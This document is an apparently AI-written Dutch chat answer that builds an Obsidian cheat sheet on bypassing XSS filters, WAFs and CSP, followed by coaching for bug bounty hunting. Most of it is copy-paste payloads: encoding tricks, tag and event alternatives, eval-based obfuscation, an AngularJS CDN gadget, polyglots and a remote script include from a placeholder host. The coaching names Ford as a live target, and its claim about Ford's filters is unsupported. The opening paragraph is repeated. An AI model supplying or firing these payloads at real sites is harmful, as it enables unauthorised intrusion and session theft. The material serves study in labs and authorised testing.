
Dit is het gedeelte waar Bug Hunting echt een kunst wordt. Als de simpele payloads (`<script>alert(1)</script>`) niet werken omdat een Firewall (WAF) of filter ze blokkeert, gebruik je deze technieken.

Hier is de complete **Obsidian Notitie** voor **XSS WAF Bypassing & Evasion**.

---

Markdown

````
# 🛡️ XSS Bypassing & WAF Evasion

==Doel: De beveiligingsfilters (WAF, Sanitization, CSP) omzeilen om alsnog code uit te voeren.==



---

## 🎭 1. Encoding Tricks (De Server Verwarren)
*Firewalls zoeken vaak naar specifieke woorden zoals `script` of `alert`. Door de tekst anders te coderen, herkent de WAF het niet, maar de browser wel.*

### Double URL Encoding
*Soms decodeert de WAF één keer (ziet `%253C` -> `%3C`), laat het door, en decodeert de backend het nogmaals naar `<`.*

* **Normaal:** `<script>` -> `%3Cscript%3E`
* **Double:** `%253Cscript%253E`
* **Triple:** `%25253Cscript%25253E`

### HTML Entities (Voor in attributen)
*Als je input in een `value="..."` attribuut belandt, decodeert de browser HTML entities automatisch.*

* **Payload:** `<img src=x onerror=alert(1)>`
* **Encoded:** `&lt;img src=x onerror=alert(1)&gt;` (Werkt niet altijd)
* **Decimal:** `&#60;img src=x onerror=alert(1)&#62;`

### Unicode Obfuscation
*Sommige karakters lijken op elkaar. Een "Evil Kelvin Sign" (`K`) kan door normalization veranderen in `k`.*

* `ſcript` (Long S) -> Wordt soms genormaliseerd naar `script`.

---

## 🏷️ 2. Tag & Event Manipulation
*Als `<script>` geblokkeerd is.*

### Alternative Tags
Gebruik elementen die JavaScript uitvoeren zonder de script-tag.

```html
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<body/onload=alert(1)>
<iframe/onload=alert(1)>

<details/ontoggle=alert(1)>
<video><source onerror="alert(1)">
<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>
````

### Alternative Events

_Als `onload` of `onerror` geblokkeerd zijn._

HTML

```
onmouseover=alert(1)   (Vereist muis)
onfocus=alert(1)       (Gebruik met autofocus)
onclick=alert(1)       (Vereist klik)
onanimationend=alert(1)
ontoggle=alert(1)
```

### Spaties Omzeilen

_WAFs haten spaties. Maar browsers accepteren ook slashes `/` als scheidingsteken._

- **Normaal:** `<img src=x onerror=alert(1)>`
    
- **Bypass:** `<img/src=x/onerror=alert(1)>`
    
- **Newline:** `<img%0Asrc=x%0Aonerror=alert(1)>`
    

---

## 🧩 3. JavaScript Obfuscation (Code Vermommen)

_Als het woord `alert` of `document.cookie` geblokkeerd is._

### String Concatenation (Aan elkaar plakken)

JavaScript

```
// In plaats van alert(1)
'al'+'ert'(1)
```

### Execution Sinks

_Manieren om tekst uit te voeren als code._

JavaScript

```
eval('al'+'ert(1)')
setTimeout('al'+'ert(1)')
Function('al'+'ert(1)')()
```

### Backticks & Unieke Syntax

_Als haakjes `()` geblokkeerd zijn._

JavaScript

```
alert`1`
```

### Encoding in JS (Hex/Octal/Unicode)

Je kunt strings schrijven met escapes.

JavaScript

```
// alert(1)
\u0061\u006c\u0065\u0072\u0074(1)
```

---

## 🚧 4. Content Security Policy (CSP) Bypass

_CSP is een header die zegt: "Je mag geen scripts laden van vreemde domeinen". Dit is lastig, maar te breken._

> [!TIP] Google CSP Evaluator Plak de CSP header altijd hierin: [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com/) Dit vertelt je direct of er gaten in zitten.

### CDN Whitelist Bypass

Als de CSP zegt: `script-src 'self' https://cdnjs.cloudflare.com`. Dan mag jij scripts laden van Cloudflare. **Aanval:** Zoek een kwetsbare bibliotheek (gadget) op Cloudflare (bijv. een oude Angular of Vue versie) en gebruik die om XSS te triggeren.

**Payload (AngularJS voorbeeld):**

HTML

```
<script src="[https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js](https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js)"></script>
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
```

### Unsafe-Inline / Unsafe-Eval

Als je deze woorden ziet in de CSP header, is de beveiliging eigenlijk uitgeschakeld.

- `unsafe-inline`: Je mag `<script>...</script>` in de HTML typen.
    
- `unsafe-eval`: Je mag `eval()` gebruiken.
    

---

## 🛠️ 5. Tools voor Bypassing

**Hackvertor (Burp Suite Extension)** _Dit is DE tool voor encoding._ Selecteer je payload in Burp Repeater -> Klik rechts -> Hackvertor -> Kies een encoding (bijv. `Hex entities` of `Throw exceptions`).

**Dalfox (Automated)** Dalfox probeert automatisch WAFs te omzeilen.

Bash

```
dalfox url "[http://target.com?q=1](http://target.com?q=1)" --waf-evasion
```

---

## 📜 6. The Polyglot List (Copy-Paste)

_Strings die proberen uit attributen, scripts én HTML te breken tegelijk._

Plaintext

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

Plaintext

```
"><img/src=x/onerror=prompt(1)>
```

Plaintext

```
" onfocus=alert(1) autofocus "
```

Plaintext

```
javascript://%250Aalert(1)//"/*\'/*"/*--></Script><Image Src=x OnError=alert(1)>
```

---

## 📝 Checklist Bypassing

- [ ] **Case Sensitivity:** Heb ik `<ScRiPt>` geprobeerd?
    
- [ ] **Tags:** Heb ik `<svg>`, `<body>`, `<details>` geprobeerd?
    
- [ ] **Encoding:** Heb ik Double URL en HTML Entities geprobeerd?
    
- [ ] **CSP:** Heb ik de header gecheckt op `unsafe-inline` of CDN whitelists?
    
- [ ] **Length:** Als de input kort is, probeer ik dan `import` scripts? (`<script src=//x.ss></script>`).

Dit is het gedeelte waar Bug Hunting echt een kunst wordt. Als de simpele payloads (`<script>alert(1)</script>`) niet werken omdat een Firewall (WAF) of filter ze blokkeert, gebruik je deze technieken.

### . Hoe WAF Evasion werkt (De poortwachter voor de gek houden)

Wanneer je die **Encoding Tricks** (zoals Double URL Encoding) gebruikt, speel je eigenlijk een spelletje "vertaal-verwarring" met de Firewall.

- De **WAF** kijkt naar de _buitenkant_ van het pakketje.
    
- De **Webserver/Browser** pakt het pakketje uit.
    

![Afbeelding van web application firewall bypass flow](https://encrypted-tbn0.gstatic.com/licensed-image?q=tbn:ANd9GcRqCA9UZAXpulcqoWTf63QOeeXMM9tS5oOWKPuNms8d1PAhehKd2vSbk2BRAVpVOCBzeJV5Zim7oivsjIzhIgf3s6weVUf0zlQDhhSNVqYf5Lo7534)

Shutterstock

**Waarom jouw notitie werkt:** De WAF ziet `%253C` en denkt: "Oh, dat is gewoon tekst (`%3C`), niks aan de hand." De Server ontvangt `%3C`, decodeert het en ziet `<`. **BAM!** Je script voert uit.

---

### 2. CSP Bypassing (De "VIP Lijst" hacken)

Je sectie over **CSP (Content Security Policy)** is cruciaal voor moderne targets zoals Ford. Zie CSP als een uitsmijter bij een club die een gastenlijst (Whitelist) heeft.

- **Normaal:** De uitsmijter zegt: "Jij staat niet op de lijst (niet van `ford.com`), je komt er niet in."
    
- **Jouw Bypass:** Je zegt: "Ik ben met hem mee" (Je gebruikt een script van Google/Cloudflare dat _wel_ op de lijst staat).
    

---

### 💡 3 Toevoegingen voor je "God Mode" Notitie

Je lijst is al 95% compleet. Hier zijn de laatste 3 tips om hem naar 100% te tillen:

#### A. De "SVG" is Koning 👑

In je lijstje met tags staat `<svg/onload=alert(1)>`. Zet daar in je notities bij: **"FAVORIET VOOR BUG BOUNTY"**.

- **Waarom:** `<svg>` werkt bijna overal en `onload` vuurt _meteen_ af (geen klik nodig van het slachtoffer).
    
- _Ford Tip:_ Omdat Ford veel moderne icoontjes gebruikt, staan SVG-tags vaak toegestaan in de filters.
    

#### B. Hackvertor is je beste vriend 🛠️

Je noemt **Hackvertor** bij de tools. Zorg dat je die **vandaag nog** installeert in Burp Suite (BApp Store).

- Het scheelt je uren handmatig typen van `%253C`.
    
- Je kunt in Repeater gewoon typen: `<@urlencode> <script>... <@/urlencode>` en hij codeert het voor je voordat hij het verstuurt.
    

#### C. De "Polyglot" als Eerste Schot 🔫

Die **Polyglot List** die je hebt toegevoegd? Gebruik die **altijd als eerste**.

- In plaats van 20 verschillende payloads te proberen, stuur je één keer die lange string.
    
- Als je ergens een pop-up ziet, of de pagina breekt raar af -> Dan weet je dat er een gat zit en kun je gaan verfijnen.
    

### 🚀 Actie voor nu

Je hebt de theorie nu vastgelegd. Tijd voor de praktijk.

Ga terug naar het **PortSwigger Lab** (of een nieuw XSS lab). Probeer eens **NIET** de standaard `<script>` te gebruiken, maar forceer jezelf om een **Bypass** uit je lijstje te gebruiken (bijvoorbeeld de `Standard` of `Double URL encoding`).

Lukt het je om de pop-up te krijgen met een "vermomde" payload?